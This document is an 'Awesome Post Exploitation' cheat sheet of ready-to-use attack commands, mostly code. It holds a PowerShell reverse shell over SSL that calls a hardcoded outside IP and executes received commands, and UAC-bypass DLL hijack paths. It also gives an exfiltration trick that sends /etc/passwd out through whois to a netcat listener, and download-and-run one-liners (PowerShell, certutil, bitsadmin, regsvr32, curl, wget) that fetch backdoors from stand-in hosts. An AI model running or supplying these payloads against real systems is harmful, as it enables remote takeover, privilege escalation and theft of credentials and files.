# Awesome Post Exploitation
## Windows Payload
### List of windows post exploitation
  
- [OpenSSL Server Reverse Shell from Windows Client](https://medium.com/walmartlabs/openssl-server-reverse-shell-from-windows-client-aee2dbfa0926) [https://medium.com/@int0x33/day-43-reverse-shell-with-openssl-1ee2574aa998]  
   - **Server side**  
`openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes`  
`openssl s_server -quiet -key key.pem -cert cert.pem -port 9876`  
   - **Client side**  
  ```
    $socket = New-Object Net.Sockets.TcpClient('206.189.70.79', 9876)
    $stream = $socket.GetStream()
    $sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]))
    $sslStream.AuthenticateAsClient('fake.domain')
    $writer = new-object System.IO.StreamWriter($sslStream)
    $writer.Write('PS ' + (pwd).Path + '> ')
    $writer.flush()
    [byte[]]$bytes = 0..65535|%{0};
    while(($i = $sslStream.Read($bytes, 0, $bytes.Length)) -ne 0)
    {$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data | Out-String ) 2>&1;
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $sslStream.Write($sendbyte,0,$sendbyte.Length);$sslStream.Flush()}  
  ```
- [LaZagne - Tool for reveal and find password in Windows](https://www.hackingarticles.in/post-exploitation-on-saved-password-with-lazagne/)   

- [**UAC Bypass via SystemPropertiesAdvanced.exe and DLL Hijacking**](https://egre55.github.io/system-properties-uac-bypass/)  
   - **List of exe**
  ```
  SystemPropertiesComputerName.exe  
  SystemPropertiesHardware.exe  
  SystemPropertiesProtection.exe  
  SystemPropertiesRemote.exe  
  ```
   - **Create "srrstr.dll" dll inside**  
  ```
  C:\Windows\SysWOW64\  
  C:\Windows\System\  
  C:\Windows\  
  C:\Users\research\AppData\Local\Microsoft\WindowsApps\  
  ```
  
## Exfiltration  
- **Send payload with whois**  
   - Server side  
  `nc -vlnp 1337 | sed "s/ //g" | base64 -d`  
   - Client side  
  ```whois -h 127.0.0.1 -p 1337 `cat /etc/passwd | base64` ```  
  
## [Create HTTP Server](https://paper.seebug.org/834/)  
  ```
  python2 -m SimpleHTTPServer 1337  
  python3 -m http.server 1337  
  php -S 0.0.0.0:1337  
  ruby -rwebrick -e'WEBrick::HTTPServer.new(:Port => 1337, :DocumentRoot => Dir.pwd).start'  
  ruby -run -e httpd . -p 1337  
  perl -MHTTP::Server::Brick -e '$s=HTTP::Server::Brick->new(port=>1337); $s->mount("/"=>{path=>"."}); $s->start' perl -MIO::All -e 'io(":8080")->fork->accept->(sub { $_[0] < io(-x $1 +? "./$1 |" : $1) if /^GET \/(.*) / })'  
  busybox httpd -f -p 8000  
  ```
## [Download file from HTTP Server](https://paper.seebug.org/834/)  
  ```
  powershell (new-object System.Net.WebClient).DownloadFile('http://1.2.3.4/5.exe','c:\download\a.exe');start-process 'c:\download\a.exe'  
  certutil -urlcache -split -f http://<C&C IP>/nc.exe nc.exe  
  bitsadmin /transfer n http://1.2.3.4/5.exe c:\download\a.exe  
  regsvr32 /u /s /i:http://1.2.3.4/5.exe scrobj.dll  
  curl http://1.2.3.4/backdoor  
  wget http://1.2.3.4/backdoor  
  awk 'BEGIN {   RS = ORS = "\r\n"   HTTPCon = "/inet/tcp/0/127.0.0.1/1337"   print "GET /secret.txt HTTP/1.1\r\nConnection: close\r\n"    |& HTTPCon   while (HTTPCon |& getline > 0)       print $0   close(HTTPCon) }'  
  ```
## [SMB Things]
- **Download file from SMB**  
`copy \\IP\ShareName\file.exe file.exe  `  
- **Upload file to SMB**  
  ```
  net use x: \\IP\ShareName
  copy file.txt x:
  net use x: /delete
  ```
